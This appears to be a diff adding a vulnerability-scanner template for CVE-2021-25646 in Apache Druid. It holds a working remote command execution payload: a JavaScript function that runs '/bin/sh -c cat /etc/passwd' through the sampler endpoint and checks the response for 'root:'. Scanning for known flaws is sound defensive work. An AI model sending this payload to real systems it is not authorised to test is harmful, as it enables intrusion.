@@ -1,0 +1,61 @@
+id: cve-2021-25646-apache-druid-rce
+info:
+  name: Apache Druid Remote Command Execution (CVE-2021-25646)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve-2021-25646,apache-druid
+
+http:
+  - method: POST
+    path:
+        - "{{BaseURL}}/druid/indexer/v1/sampler"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+      "type":"index",
+      "spec":{
+      "ioConfig":{
+      "type":"index",
+      "firehose":{
+         "type":"local",
+         "baseDir":"/etc",
+         "filter":"passwd"
+      }
+      },
+      "dataSchema":{
+      "dataSource":"odgjxrrrePz",
+      "parser":{
+         "parseSpec":{
+            "format":"javascript",
+            "timestampSpec":{
+            },
+            "dimensionsSpec":{
+            },
+            "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}",
+            "":{
+               "enabled":"true"
+            }
+         }
+      }
+      }
+      },
+      "samplerConfig":{
+      "numRows":10
+      }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
